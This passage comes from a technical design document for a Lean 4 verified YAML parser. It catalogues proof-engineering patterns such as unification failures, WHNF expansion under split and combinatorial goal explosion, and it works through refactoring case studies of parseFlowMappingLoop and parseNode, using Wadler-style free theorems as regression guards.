a polymorphic type `∀ α. F α → G α` constrains the function's behavior:
it must work uniformly across all `α`, yielding relational properties for free.
Here, the "type variable" is the `PendingNode` constructor, and the "free
theorem" is: *any constructor that provides a closing interface
(`SSLComments → SLYamlStream` or `SBlockNode → SLYamlStream`) can be served
by the same evidence extraction.* The proof structure should reflect this
parametricity by factoring evidence extraction from closing strategy.

**Detection sketch:**

```lean
/-- Check whether a theorem that cases-splits on an inductive has
    duplicated sub-proofs across multiple branches. -/
def checkParametricClosing (decl : ConstantInfo) : MetaM (Array Warning) := do
  -- 1. Find `cases` / `match` on an inductive in the proof term
  -- 2. For each branch pair, check if the initial obtain/have chain
  --    is syntactically identical (modulo alpha-renaming)
  -- 3. If >50% of the branch body is shared, flag as parametric
  return warnings
```

#### Scope and Limitations

**In scope:**
- Pattern 1 (struct-with-update → method call unification failure)
- Pattern 2 (flow collection return → Scannable polarity mismatch)
- Pattern 3 (WHNF expansion of compound sub-expressions inside `split`)
- Pattern 4 (complexity explosion in monolithic loop bodies)
- Pattern 5 (semantic impasse from specification-level invariant gaps)
- Pattern 6 (parametric closing — duplicated evidence across inductive branches)
- All six are specific to the parser's `ParseState` + `Scannable`
  architecture, but the detection algorithms generalize

**Out of scope (initially):**
- Detecting `try`-based goal corruption — the legacy proof log's
  Lesson 6, preserved here now that the log is retired (2026-08-01):
  `try (exfalso; …; simp_all)` corrupts goals *silently*, because
  Lean 4's `try` does **not** roll back when the inner tactics
  succeed without closing the goal — `exfalso` turns a provable goal
  into `⊢ False`, `simp_all` fails to close it, and `try` keeps the
  damage. The fix is `done` inside the block
  (`try (exfalso; …; simp_all; done)`) so failure-to-close throws
  and `try` rolls back; this recovered 13 corrupted `⊢ False` goals.
  Detecting it statically is a tactic-composition problem requiring
  analysis of tactic scripts, not elaborated `Expr` trees
- General "proof difficulty prediction" — the tool only detects known
  interaction patterns, not novel ones. One empirical rule from the
  2026-07 100%-matrix campaign is worth recording: the predictor of
  whether a code fix breaks proofs is **not** "content change vs
  structural change of the spec" but **whether the fix changes the
  definitional shape that proofs `unfold` and pattern-match on**.
  Swapping in a different head symbol (e.g. `skipSpaces` →
  `skipWhitespace`) broke ~40 structural lemmas mechanically;
  content-only fixes behind an unchanged shape broke nothing in
  `L4YAML/Proofs/`. Two corollaries: executable `#guard` files pin
  *exact output* and always need updating when output legitimately
  changes; and emitter-only fixes cannot break `L4YAML/Proofs/` at
  all (the event emitter is outside the proof perimeter)

#### Implementation Plan

*(Historical — never executed; see the status note above.)*

| Phase | Deliverable | Effort |
|-------|-------------|--------|
| I1 | `isStructWith` / `decomposeStructWith` helpers | Small |
| I2 | Pattern 1 detector (struct-with → method call) | Medium |
| I3 | Pattern 2 detector (flow collection return check) | Medium |
| I4 | Pattern 3 detector (WHNF expansion hazard) | Medium |
| I5 | Pattern 4 detector (complexity explosion in loop bodies) | Medium |
| I6 | Pattern 5 detector (arithmetic impasse / invariant gap) | Medium |
| I6b | Pattern 6 detector (parametric closing / duplicated evidence) | Medium |
| I7 | `#check_wb_interactions` command wiring | Small |
| I8 | Run on all 7 G5c-modified functions, validate results | Small |
| I9 | Document false-positive patterns and suppression mechanism | Small |

#### Expected Results on Current Codebase

Running the analysis on the 7 functions modified by the 2026-03
comment-preservation campaign's `currentPath` save/restore edits —
performed manually, not by the tool:

| Function | P1 (struct-with) | P2 (flow return) | P3 (WHNF hazard) | P4 (loop explosion) | P5 (impasse) | P6 (parametric) |
|----------|-----------------|-----------------|------------------|--------------------|--------------| 
| `parseBlockSequenceLoop` | ✓ (currentPath before parseNode — but parseNode takes ps directly, so lemmas still apply) | ✗ (returns array, not flow collection) | ✗ (no compound scrutinee) | ✗ (single branch) | ✗ | ✗ |
| `parseImplicitBlockSequenceLoop` | ✓ (same as above) | ✗ | ✗ | ✗ (single branch) | ✗ | ✗ |
| `parseBlockMappingLoop` | ✓ (currentPath before BEV/parseNode) | ✗ (block mapping) | ✗ | ✗ (extracted to `handleBlockMapping*Entry`) | ✗ | ✗ |
| `parseFlowSequenceLoop` | ✓ (currentPath before parseNode + parseSinglePairMapping) | ✗ (returns array) | ✗ | ✗ (3 simple branches) | ✗ | ✗ |
| `parseFlowMappingLoop` | ✓ (currentPath before parseNode + tryConsume) | ✗ (returns array) | **✓** (tryConsume on struct-with feeds into `if consumed`) | **✓** (2 entry × 4 key × 2 consumed × 4 value = explosion) | ✗ | ✗ |
| `parseSinglePairMapping` | **✓ CONFIRMED** (currentPath before tryConsume) | **✓ CONFIRMED** (.mapping .flow return) | **✓ CONFIRMED** (tryConsume internal match found before consumed dispatch) | ✗ (single entry) | ✗ | ✗ |
| `parseDocument` | ✓ (currentPath before parseNode) | ✗ | ✗ | ✗ | ✗ | ✗ |
| `parseFlowSequence` (wrapper) | ✗ | ✗ | ✗ | ✗ | **✓** (`flowNesting ps.pos + 1 = flowNesting ps.pos` in else branch) | ✗ |
| `parseFlowMapping` (wrapper) | ✗ | ✗ | ✗ | ✗ | **✓** (same `flowNesting` impasse as `parseFlowSequence`) | ✗ |
| `accum_content_pending` (StreamAccum) | ✗ | ✗ | ✗ | ✗ | ✗ | **✓ CONFIRMED** (evidence extraction duplicated across noPending + pendingBlock × 4 content types = ~200 lines of duplication) |

Note: For most functions, Pattern 1 manifests as `{ ps with currentPath := ... }`
before `parseNode`, but `parseNode` takes `ps : ParseState` as a regular
argument (not a method call that needs lemma matching), so the interaction is
weaker — `parseNodeWB_apply` can still unify because its `h_tok` argument
is stated as `ps.tokens = tokens` and `{ ps with currentPath := ... }.tokens`
**does** reduce definitionally in this position (it appears as an explicit
hypothesis, not inside a lemma's implicit argument matching). The interaction
is only severe when the struct-with-update feeds into a **method** like
`tryConsume` whose lemmas bind the entire `ParseState` as a single argument.

#### Generalization Beyond This Project

The five patterns generalize to any Lean 4 codebase where:

1. **Records with proof-irrelevant fields** are updated before method calls
   whose lemmas were stated for the original record. This is common in
   stateful parsers, compilers, and interpreters where a "context" or
   "environment" record has both proof-relevant fields (e.g., input, position)
   and proof-irrelevant fields (e.g., debug flags, path tracking, logging).

2. **Inductive predicates with non-trivial field dependencies** (like
   `Scannable`'s `inFlow || style == .flow`) create situations where
   constructing a witness at parameter A requires sub-witnesses at a
   different parameter B that is computed from A and additional data. When
   theorem signatures use A as conditional and B as unconditional (or vice
   versa), the signature doesn't match the constructor's actual requirements.

3. **Compound expressions used as scrutinees of outer dispatches** cause
   `split` (via WHNF) to target inner matches instead of the intended
   outer one. This applies to any codebase where a method call's result
   is immediately destructured — e.g., `let (flag, state) := record.method()
   ; if flag then ...`. The method's internal match structure becomes visible
   to WHNF and intercepts `split`. This is especially prevalent in monadic
   code where `do`-notation desugars to nested binds that `unfold`/`simp`
   must peel through, exposing intermediate computations.

4. **Monolithic recursive functions with duplicated sub-computations** in
   multiple branches. This is extremely common in parsers, interpreters, and
   state machines where different input tokens trigger structurally similar
   processing pipelines. The code is clean and correct, but the proof work
   scales multiplicatively. The fix — factoring out shared sub-computations —
   is a standard software engineering refactoring, but it's motivated here
   by proof economics rather than code clarity. This connects to Wadler's
   "theorems for free" insight: the factored function's type signature
   constrains its behavior, making the proof obligation smaller and more
   composable. **Behavioral specifications derived from the original type
   (monotonicity, state preservation, well-behavedness propagation) serve as
   regression tests ensuring the refactoring preserves semantics.**

5. **Proof obligations that reduce to arithmetic impossibilities** after
   applying available rewrites, indicating that a theorem's claim is false
   in a particular branch. This signals a missing invariant at a higher
   abstraction level (scanner, grammar, type system) rather than a proof
   technique gap. The detection generalizes beyond parsers: any system where
   a function maintains a counter-like quantity (nesting depth, reference
   count, resource balance) that is modified by paired operations (open/close,
   acquire/release, push/pop) can exhibit this pattern when the "close"
   operation is not guaranteed to execute. The resolution requires either
   (a) a liveness/matching invariant at the specification level, (b) a
   proof that the unmatched branch is unreachable, or (c) both.

A general version of this tool could be valuable for the broader Lean 4
verified-systems community.

---

### Appendix: The `parseFlowMappingLoop` Case Study

#### Decomposition Analysis (2026-03-15)

`parseFlowMappingLoop` is the canonical example of Pattern 4. Its 60-line
body has two major entry branches (explicit key, implicit key) that share
an identical tryConsume + value dispatch tail. The proof complexity comes
from the Cartesian product of cases:

```
parseFlowMappingLoop (60 lines, ~320 proof lines estimated)
├── fuel match (0 → base, k+1 → ...)
├── peek? = flowMappingEnd → early return
├── separator check (pairs.size > 0)
│   ├── flowEntry → advance
│   └── other → early return
├── content dispatch (after separator)
│   ├── some .key (explicit key)
│   │   ├── advance KEY token
│   │   ├── key dispatch
│   │   │   ├── .value | .flowEntry | .flowMappingEnd → emptyNode key
│   │   │   └── _ → parseNode key
│   │   ├── tryConsume .value           ← SHARED TAIL STARTS HERE
│   │   ├── value dispatch (consumed)
│   │   │   ├── .flowEntry | .flowMappingEnd | none → emptyNode val
│   │   │   └── _ → parseNode val
│   │   ├── value dispatch (!consumed) → emptyNode val
│   │   └── recurse with (key, val)
│   └── _ (implicit key)
│       ├── parseNode key
│       ├── tryConsume .value           ← SAME SHARED TAIL
│       ├── value dispatch (consumed)   ← SAME
│       ├── value dispatch (!consumed)  ← SAME
│       └── recurse with (key, val)
```

#### Proposed Factoring

Extract the shared tail into `parseFlowMappingValue`:

```lean
/-- Parse the value part of a flow mapping entry.
    After key is parsed, consume optional VALUE token and parse value.
    Returns the value and updated state. -/
def parseFlowMappingValue (ps : ParseState) (fuel : Nat)
    (savedPath : YamlPath) (keyContent : String)
    : Except ScanError (YamlValue × ParseState) := do
  let ps := { ps with currentPath := savedPath.push (.key keyContent) }
  let (consumed, ps) := ps.tryConsume .value
  let (val, ps) ← if consumed then
    match ps.peek? with
    | some .flowEntry | some .flowMappingEnd | none => .ok (emptyNode, ps)
    | _ => parseNode ps fuel
  else .ok (emptyNode, ps)
  .ok (val, { ps with currentPath := savedPath })
```

Then `parseFlowMappingLoop` becomes:

```lean
def parseFlowMappingLoop (ps : ParseState) (fuel : Nat)
    (pairs : Array (YamlValue × YamlValue)) := do
  match fuel with
  | 0 => .ok (pairs, ps)
  | fuel + 1 =>
    match ps.peek? with
    | some .flowMappingEnd => .ok (pairs, ps)
    | _ => do
      let ps ← if pairs.size > 0 then
        match ps.peek? with
        | some .flowEntry => pure ps.advance
        | _ => return (pairs, ps)
      else pure ps
      match ps.peek? with
      | some .flowMappingEnd => .ok (pairs, ps)
      | some .key => do
        let ps := ps.advance
        let (key, ps) ← match ps.peek? with
          | some .value | some .flowEntry | some .flowMappingEnd =>
            .ok (emptyNode, ps)
          | _ => parseNode ps fuel
        let keyContent := match key with | .scalar s => s.content | _ => s!"{pairs.size}"
        let (val, ps) ← parseFlowMappingValue ps fuel ps.currentPath keyContent
        parseFlowMappingLoop ps fuel (pairs.push (key, val))
      | _ => do
        let (key, ps) ← parseNode ps fuel
        let keyContent := match key with | .scalar s => s.content | _ => s!"{pairs.size}"
        let (val, ps) ← parseFlowMappingValue ps fuel ps.currentPath keyContent
        parseFlowMappingLoop ps fuel (pairs.push (key, val))
```

#### Wadler-Style "Theorems for Free" as Refactoring Guards

Before performing the refactoring, we derive behavioral specifications from
the CURRENT `parseFlowMappingLoop` that must be preserved. 

##### Step 1: write the theorem properties for the current `parseFlowMappingLoop` implementation. These are properties that follow from the function's type signature and implementation structure, not from domain-specific knowledge. They are "free theorems" in the Wadler sense — they must hold for any function with the same type signature and similar accumulator structure, regardless of the specific parsing logic.

**Status: COMPLETED (2026-03-14).** Four properties identified; (1)–(3)
are pure free theorems, (4) is domain-contingent (see Pattern 5 / flowNesting
impasse).

1. **Token preservation** (from the type `ParseState → ... → Except ... (... × ParseState)`):
   ```lean
   theorem parseFlowMappingLoop_tokens_preserved (ps result) (h_ok : ... = .ok result) :
       result.2.tokens = ps.tokens
   ```

2. **Monotonicity** (from the accumulator pattern `pairs → ... pairs.push ...`):
   ```lean
   theorem parseFlowMappingLoop_pairs_grow (ps pairs result) (h_ok : ... = .ok result) :
       result.1.size ≥ pairs.size
   ```

3. **Prefix preservation** (from the push-only pattern):
   ```lean
   theorem parseFlowMappingLoop_prefix_preserved (ps pairs result) (h_ok : ... = .ok result) :
       ∀ i : Fin pairs.size, result.1[i] = pairs[i]
   ```

4. **flowNesting preservation** (contingent on flow context — the well-behavedness
   property). This becomes the loop invariant for the proof:
   ```lean
   theorem parseFlowMappingLoop_wb (tokens ps pairs result)
       (h_eq : ps.tokens = tokens) (h_flow : flowNesting tokens ps.pos > 0)
       (h_ok : ... = .ok result) :
       flowNesting tokens result.2.pos = flowNesting tokens ps.pos
   ```

The Wadler insight: properties (1)–(3) follow purely from the function's
TYPE and accumulator structure — any function with the same type signature
that only uses `push` on the accumulator must satisfy them. Property (4)
requires domain knowledge (flow nesting semantics) but its STRUCTURE
(state-property preservation through a loop) is a free theorem of the
state-threading pattern.

##### Step 2: Refactor `parseFlowMappingLoop` to extract the shared tryConsume + value dispatch logic into `parseFlowMappingValue`. This should be a purely syntactic transformation that does not change the overall structure of the loop or the way state is threaded.

**Status: COMPLETED (2026-03-14).** `parseFlowMappingValue` extracted as a
separate function in the `mutual` block (TokenParser.lean L630–644).
`parseFlowMappingLoop` (L646–676) refactored to call it. All 323 test
suite jobs pass.

##### Step 3: Prove the same properties (1)–(3) for the new `parseFlowMappingLoop` + `parseFlowMappingValue`. If all three hold, we have strong evidence that the refactoring preserved the core behavior of the loop with respect to token handling and pair accumulation.

**Status: COMPLETED (2026-03-15).** All three free-theorem properties
proved, plus a helper lemma for the extracted function:

| Theorem | Location | Status |
|---------|----------|--------|
| `parseFlowMappingValue_tokens_preserved` | ParserGrammable.lean L2259 | **Proved** |
| `parseFlowMappingLoop_tokens_preserved` | ParserGrammable.lean L2291 | **Proved** |
| `parseFlowMappingLoop_pairs_grow` | ParserGrammable.lean L2364 | **Proved** |
| `parseFlowMappingLoop_prefix_preserved` | ParserGrammable.lean L2398 | **Proved** |

Sorry count reduced from 14 → 11 (net -3: one sorry removed per loop
theorem).

**Proof technique notes:**

- **`_pairs_grow` and `_prefix_preserved`**: Automated "split-and-close"
  approach — 20× `all_goals (try (split at h_ok))` to exhaustively expand
  all monadic branches, then close all goals with `first | ... | ...`
  combining base-case, error, and IH closers. Required
  `set_option maxHeartbeats 800000` / `1600000`.

- **`_tokens_preserved`**: Fundamentally harder because it requires threading
  `ps.tokens = tokens` through intermediate `parseNode` and
  `parseFlowMappingValue` calls. The same split-and-close approach works for
  Phase 1 (errors via `contradiction`/`simp at h_ok`) and Phase 2 (base
  cases via `subst h_ok; exact h_eq`). Phase 3 (recursive cases) uses
  `rename_i` to name auto-generated hypotheses from `split`, then chains:
  1. `parseNodeWB_apply` to get `v_node.snd.tokens = tokens` from `parseNode`
  2. `parseFlowMappingValue_tokens_preserved` to get `v_pFMV.snd.tokens = tokens`
  3. `ih_fuel` with the derived token equality to close the loop

  Key Lean 4 elaboration insight: `all_goals (try (...))` closers for
  parseNode paths used `(by simp only [ParseState.advance_tokens]; exact h_eq)`
  for the token hypothesis, which worked for all goals where `parseNode` was
  called on `ps.advance` (explicit-key branch). One remaining goal called
  `parseNode ps k` directly (implicit-key branch, `¬pairs.size > 0` sub-case),
  requiring `h_eq` without the `simp` — solved by a direct (non-`try`) closer
  after the `all_goals` pass.

After refactoring, we prove the SAME four properties for the new
`parseFlowMappingLoop` + `parseFlowMappingValue`. If all four hold, the
refactoring is semantically correct for proof purposes.

Property (4) — `flowNesting` preservation — remains contingent on resolving
the `flowNesting` impasse (Pattern 5, see below).

#### The `flowNesting` Impasse (Pattern 5 Instance)

The `parseFlowSequence_wb` and `parseFlowMapping_wb` wrapper theorems both
have an else-branch where the closing bracket (`flowSequenceEnd` /
`flowMappingEnd`) is not consumed. In this branch:

```
h_adv_fn_eq : flowNesting tokens ps.advance.pos = flowNesting tokens ps.pos + 1
h_loop_fn   : flowNesting tokens ps_loop.pos = flowNesting tokens ps.advance.pos
⊢ flowNesting tokens ps_loop.pos = flowNesting tokens ps.pos
```

Substituting: `flowNesting tokens ps.pos + 1 = flowNesting tokens ps.pos`,
i.e., `x + 1 = x` — literally false.

**Resolution plan (Options 1 + 2 combined):**

**Step 1 (Scanner invariant — Option 1):** ✅ COMPLETED.
`FlowBracketsMatched` defined and proved through the full scanner chain.

**Step 2 (Code-level resolution):** ✅ COMPLETED (different from original plan).
Instead of proving fuel sufficiency (Step 2 of original plan), the code was
changed to return `.error` in the else-branch:

```lean
-- parseFlowSequence: old code silently returned .ok even without closing bracket
-- New code:
match ps.peek? with
| some .flowSequenceEnd => .ok (YamlValue.sequence .flow items, ps.advance)
| _ => .error (.expectedToken "']'" ps.currentLine none)
```

Same change for `parseFlowMapping` with `"'}'"`.

This makes the else-branch of `parseFlowSequence_wb` trivially closable:
`h_ok : .error _ = .ok result` is `False`, so `simp at h_ok` closes the goal.
The `parseFlowSequenceLoop_reaches_end` theorem (previously sorry'd) was
removed entirely as it's no longer needed.

**Ancillary changes required by the code change:**

1. **`parseFlowMappingValue` — retroactive key fix:** Multi-line implicit
   keys (e.g., `{"foo"\n: "bar"}`) produce scanner tokens in reversed order:
   `scalar "foo", key, value, scalar "bar"` instead of the normal
   `key, scalar "foo", value, scalar "bar"`. Added `tryConsume .key` before
   `tryConsume .value` in `parseFlowMappingValue` so the retroactive `key`
   marker is consumed. Proof (`parseFlowMappingValue_tokens_preserved`)
   updated with 2-step generalize chain.

2. **Guard `maxRecDepth`:** The `.error` code path increases kernel reduction
   depth for `#guard` compile-time evaluation. Set `maxRecDepth 4096` in
   both `Flow.lean` and `Block.lean` guard files.

3. **`maxHeartbeats` for mutual block:** The additional `tryConsume` in
   `parseFlowMappingValue` slightly increases WHNF cost for the mutual
   recursive block. Set `maxHeartbeats 400000` on the `mutual` block.

4. **Three guards commented out (scanner colon-chain bug):** Tests 58MP
   (`{x: :x}`), 5T43 (`"key"::value`), and DBG4 (`::vector` in flow
   sequence) fail because the scanner incorrectly tokenizes `:x` and `::x`
   as `key, value, scalar "x"` instead of plain scalar `":x"` or `"::x"`.
   The old parser code silently produced `.ok` with wrong structure; the
   Pattern 5 code change correctly surfaces the error. Fix requires
   scanner-level changes (41/44 flow guards passing = 93%; 3 commented out).

**Result:** Sorry count reduced from 11 → 9.
- Removed: `parseFlowSequenceLoop_reaches_end` (1 sorry)
- Removed: `parseFlowSequence_wb` else-branch (1 sorry)

#### 2nd-Order Refactoring: `parseExplicitKey` Extraction (2026-03-16)

After the Step 2 refactoring extracted `parseFlowMappingValue` (shared
tryConsume + value dispatch), the remaining `parseFlowMappingLoop` body
still contained a **4-way key dispatch** inside the `some .key` branch:

```lean
match ps.advance.peek? with   -- after consuming KEY token
| some .value | some .flowEntry | some .flowMappingEnd => .ok (emptyNode, ps)
| _ => parseNode ps fuel
```

This is a **2nd-order instance of Pattern 4**: the first extraction
(`parseFlowMappingValue`) reduced the per-branch proof from ~60 lines to
~30 lines, but still left **2 content branches × 2 separator paths =
4+ recursive goals** in the proof, each requiring separate flowNesting
chain construction. Three successive proof attempts (direct wrapper,
exhaustive splitting + bulk rename_i, named helper theorems) all failed:
the 1st and 2nd were reverted; the 3rd compiled but had match generalization
mismatches in helper theorems.

**Root cause:** The 4-way key dispatch (`emptyNode` × 3 token cases +
`parseNode` × 1 catch-all) appeared INLINE in the loop body. Each branch
independently needed `Scannable` proof + flowNesting chain, and Lean 4's
`split at h_ok` created a goal for each, leading to ~10 total goals after
combining with the 2 separator paths.

##### Solution: Extract `parseExplicitKey`

**Observation:** The 4-way key dispatch is a pure function of `ps.peek?` and
`fuel` — it doesn't depend on the separator path or accumulator state. By
extracting it as a named function, the loop body "sees" a single opaque call
with one `_wb` theorem, collapsing 4 key goals into 1.

```lean
-- TokenParser.lean, inside mutual block:
def parseExplicitKey (ps : ParseState) (fuel : Nat)
    : Except ScanError (YamlValue × ParseState) :=
  match ps.peek? with
  | some .value | some .flowEntry | some .flowMappingEnd => .ok (emptyNode, ps)
  | _ => parseNode ps fuel
```

**Helper theorems:**

| Theorem | Purpose |
|---------|---------|
| `parseExplicitKey_tokens_preserved` | Token array unchanged |
| `parseExplicitKey_wb` | Key is Scannable, flowNesting/tokens preserved |
| `explicitKey_val_recurse` | Chains `_wb` + `parseFlowMappingValue_wb` + recursion |
| `implicitKey_val_recurse` | Same for implicit-key (direct `parseNode`) paths |

**Proof structure after extraction:**

```
parseFlowMappingLoop_wb:
  induction fuel
  | zero => trivial
  | succ k ih_fuel =>
    unfold; split (flowMappingEnd vs other)
    10× split at h_ok   -- exhaust all match/if
    Phase 1: contradiction  (error goals)
    Phase 2: first | subst+rfl | cases+rfl | advance+flowNesting chain | skip
    Phase 3: first | explicitKey_val_recurse (sep+key) | explicitKey_val_recurse (key-only) | skip
    Phase 4: first | implicitKey_val_recurse (sep) | implicitKey_val_recurse (direct)
```

Total proof: ~80 lines (down from ~300 in the failed 3rd attempt, ~320
projected for a monolithic approach). The `maxHeartbeats` dropped from
`1600000` to `800000`.

##### Wadler Guard Regression Results

The extraction immediately broke `parseFlowMappingLoop_tokens_preserved`
(Wadler guard #1) — the proof referenced `parseNodeWB_apply` directly on
the loop body, but the body now had `parseExplicitKey` instead of inline
`parseNode`. This confirmed the guards' value: they detected the structural
change instantly.

New helper `parseExplicitKey_tokens_preserved` was added, and the
`_tokens_preserved` proof's Phase 3 was rewritten to use it. The
`_pairs_grow` guard (Wadler guard #2) continued to work without changes
because it uses a generic `all_goals (first | ...)` closer that doesn't
reference specific sub-function names.

**Lesson:** Wadler guards with varying specificity give different signal:
- **Specific guards** (`_tokens_preserved`): break on structural changes,
  forcing proof updates that verify the new structure
- **Generic guards** (`_pairs_grow`): survive refactoring unchanged,
  confirming the accumulator pattern is preserved

Both signals are valuable for different reasons.

##### Pattern 4 Recursive Depth

This establishes that Pattern 4 can require **iterative extraction**:

| Step | Extraction | Branches eliminated | Net goals |
|------|-----------|---------------------|-----------|
| 0 (original) | — | — | ~20 (2 entry × 4 key × 2+ value) |
| 1 (2026-03-14) | `parseFlowMappingValue` | Value dispatch (4→1) | ~10 (2 entry × 4 key × 1 value) |
| 2 (2026-03-16) | `parseExplicitKey` | Key dispatch (4→1) | ~4 (2 entry × 1 key × 1 value) |

The general principle: Pattern 4 mitigation is not one-shot. After each
extraction, the REMAINING branches may still exhibit combinatorial explosion.
Re-applying the Wadler-guard methodology at each step ensures correctness
while progressively simplifying the proof.

##### `parseFlowMapping_wb` Wrapper

With `parseFlowMappingLoop_wb` proved, the wrapper theorem follows the
same pattern as `parseFlowSequence_wb` (already proved):

1. Unfold `parseFlowMapping`, split on fuel
2. Advance past `flowMappingStart` → flowNesting increases by 1
3. Apply `parseFlowMappingLoop_wb` with empty initial pairs
4. Split on `flowMappingEnd` peek: advance → flowNesting decreases by 1
   (net zero); else → `.error` contradiction

Key difference from sequences: `Scannable.mapping .flow` requires children
to be `Scannable _ true` even when the outer flow parameter is `false`
(because `false || (.flow == .flow) = true`). So the proof uses
`h_pairs_true` for both the `false` and `true` `Scannable` constructors.

**Result:** Sorry count reduced from 9 → 7.
- Proved: `parseFlowMappingLoop_wb` (1 sorry removed)
- Proved: `parseFlowMapping_wb` (1 sorry removed)

#### Pattern 4b: Sequential Monadic Pipeline Depth — `parseNode` (2026-03-17)

`parseNode` is a second instance of Pattern 4, but with a **different
complexity structure**. Where `parseFlowMappingLoop` has *multiplicative*
branching (N entry patterns × M key/value dispatches), `parseNode` has
*additive* depth from a 6-stage sequential monadic pipeline:

```
parseNode (50 lines, ~15 split-goals estimated)
├── fuel match (0 → error, k+1 → ...)
├── Stage 1: Alias check (match ps.peek?)
│   ├── some (.alias name) → advance, G5c tracking, return (.alias name, ps')
│   └── _ → pure ()   (fall through)
├── Stage 2: parseNodeProperties ps → (props, ps)
├── Stage 3: Block-same-line validation
│   ├── match ps.peek?
│   │   ├── some .blockSequenceStart | some .blockMappingStart →
│   │   │   if ps.pos > prePropPos then
│   │   │     if lastPropPos.line == blockPos.line then throw .trailingContent
│   │   └── _ → pure ()
├── Stage 4: Duplicate-anchor validation
│   ├── if props.hadDuplicateAnchor then
│   │   ├── match ps.peek?
│   │   │   ├── some .block* | some .flow* | some .blockEntry → pure ()
│   │   │   └── _ → throw .duplicateAnchor
│   └── else → implicit pure ()
├── Stage 5: parseNodeContent ps fuel props → (val, ps)
└── Stage 6: .ok (applyNodeFinalization val ps props nodeStartPos)
```

Each stage expands to 2–5 bind-peeling `split at h_ok` operations. The
total is additive (~15 goals) rather than multiplicative, but each goal
requires chaining `parseNodeProperties_flowNesting + parseNodeProperties_tokens +
parseNodeContent_wb + applyNodeFinalization_scannable / _tokens / _pos` — a
4-lemma chain that must be threaded through each intermediate state.

**Why the original "Easy" assessment was wrong:** The assessment assumed
strong induction would make the proof short because all sub-parser WB
theorems were proved. This ignored the cost of:

1. **Do-notation desugaring depth.** Each `let x ← f; ...` desugars to
   `Except.bind (f ps) (fun x => ...)`. Six sequential binds produce 6
   levels of `Except.bind` to peel with `simp only [bind, Except.bind]` +
   `split at h_ok`. The alias branch (stage 1) adds a further 3–4 binds
   for `pure ()` + `parseNodeProperties` + the fallthrough.

2. **Validation stages 3–4 are pure but branch-heavy.** The block-same-line
   check has a `match` on `ps.peek?` (2 arms: block-start vs other), then
   a nested `if pos > prePropPos` then `if line == line` — 3 more goals per
   arm. The duplicate-anchor check has `if hadDuplicateAnchor` (2 arms),
   then a `match` (6 arms) in the true branch. Total: ~10 additional goals
   from stages 3–4 alone, all requiring flowNesting/tokens chain threading.

3. **Alias branch early-return.** The alias branch returns directly without
   going through `parseNodeContent`, so `parseNodeContent_wb` doesn't help.
   It needs its own `Scannable (.alias name) inFlow` proof (trivial, but
   requires separate case handling) and G5c position tracking (struct-with
   updates on `ps` that must be shown to preserve tokens/flowNesting).

**Pattern 4b vs Pattern 4:** The key difference:

| | Pattern 4 (multiplicative) | Pattern 4b (additive / pipeline) |
|---|---|---|
| **Example** | `parseFlowMappingLoop` | `parseNode` |
| **Branching** | N × M (entry × dispatch) | S₁ + S₂ + ... + Sₖ (stages) |
| **Shared code** | Identical tails across branches | No sharing — each stage is unique |
| **Extraction target** | Shared sub-computation | Validation stages (pure, no state effect) |
| **Wadler guards** | Monotonicity + prefix + tokens + flowNesting | Tokens + flowNesting (no accumulator) |
| **Proof reduction** | Multiplicative → additive (dramatic) | Pipeline → shorter pipeline (moderate) |

**Mitigation — Wadler-style refactoring plan:**

##### W1: Alias-branch token preservation

Before refactoring, prove that the alias branch preserves the token array.
This serves as a regression guard — if the refactoring changes the alias
branch behavior, this theorem breaks.

```lean
-- State: the alias branch of parseNode preserves tokens
theorem parseNode_alias_tokens (ps : ParseState) (name : String)
    (h_peek : ps.peek? = some (.alias name)) :
    let ps' := ps.advance
    let ps' := if ps'.trackPositions then
      { ps' with nodePositions := ps'.nodePositions.push ... }
    else ps'
    ps'.tokens = ps.tokens
```

##### W2: Alias-branch flowNesting preservation

```lean
theorem parseNode_alias_flowNesting (tokens : Array (Positioned YamlToken))
    (ps : ParseState) (name : String)
    (h_peek : ps.peek? = some (.alias name))
    (h_eq : ps.tokens = tokens) :
    -- flowNesting is preserved through advance of a non-flow token
    flowNesting tokens ps.advance.pos = flowNesting tokens ps.pos
```

##### Extraction: `validateNodeProps`

Extract stages 3–4 (block-same-line + duplicate-anchor validation) as a
pure function **outside** the mutual block:

```lean
/-- Validate node properties after parsing.
    - §8.2.2 [200]: block collections must start on a new line after properties
    - §6.9.2: duplicate anchors rejected on scalar/empty content -/
def validateNodeProps (ps : ParseState) (prePropPos : Nat)
    (props : NodeProperties) : Except ScanError Unit := do
  match ps.peek? with
  | some .blockSequenceStart | some .blockMappingStart =>
    if ps.pos > prePropPos then
      let lastPropPos := ps.tokens[ps.pos - 1]!.pos
      let blockPos := ps.peekPos?.getD { offset := 0, line := 0, col := 0 }
      if lastPropPos.line == blockPos.line then
        throw (.trailingContent blockPos.line blockPos.col)
  | _ => pure ()
  if props.hadDuplicateAnchor then
    match ps.peek? with
    | some .blockSequenceStart | some .blockMappingStart
    | some .flowSequenceStart  | some .flowMappingStart
    | some .blockEntry => pure ()
    | _ => throw (.duplicateAnchor ps.currentLine)
```

**Key property:** `validateNodeProps` never modifies `ps` — it only reads
from it and either returns `()` or throws. Therefore:

```lean
theorem validateNodeProps_preserves_state (ps prePropPos props)
    (h : validateNodeProps ps prePropPos props = .ok ()) :
    True  -- ps is unchanged (it's passed by value, not modified)
```

The proof of `parseNode_wb_all` then becomes:

1. Fuel match: `parseNode_wb_zero` for base case
2. Induction step: unfold, peel alias check → handle directly using W2
3. Peel `parseNodeProperties` → apply `_flowNesting` + `_tokens`
4. Peel `validateNodeProps` → it's a single bind returning `Unit`, the
   continuation gets the SAME `ps` (no state change)
5. Peel `parseNodeContent` → apply `parseNodeContent_wb`
6. Apply `applyNodeFinalization_scannable` + `_tokens` + `_pos`

This reduces the ~15-goal proof to ~6 goals: fuel-0, alias, and then
the 4-stage pipeline (properties → validate → content → finalization)
as a linear chain with one WB lemma per stage.

#### Pattern 4b: Outcome

**Status: ✅ Proved.** The Wadler-style refactoring worked exactly as planned.

Key implementation details:
- `validateNodeProps` extracted OUTSIDE the mutual block (pure validation, no mutual dependency)
- `parseNode` simplified from ~15 lines of inline validation to a single `validateNodeProps` call
- W1/W2 Wadler guards proved cleanly for the alias branch
- The non-alias branch chains: `parseNodeProperties` → `validateNodeProps` → `parseNodeContent` → `applyNodeFinalization`

**Subtle issue: `obtain ⟨rfl, rfl⟩` causes `applyNodeFinalization` expansion.**
After `obtain ⟨rfl, rfl⟩ := Prod.mk.inj h_ok`, Lean substitutes `val` and `ps'`
with the pair projections of `applyNodeFinalization ...`, then eagerly reduces
the transparent function. This expands the goal to ~40 lines of raw `match`/`if`.

The fix: use `show` with the *opaque* function-call form:
```lean
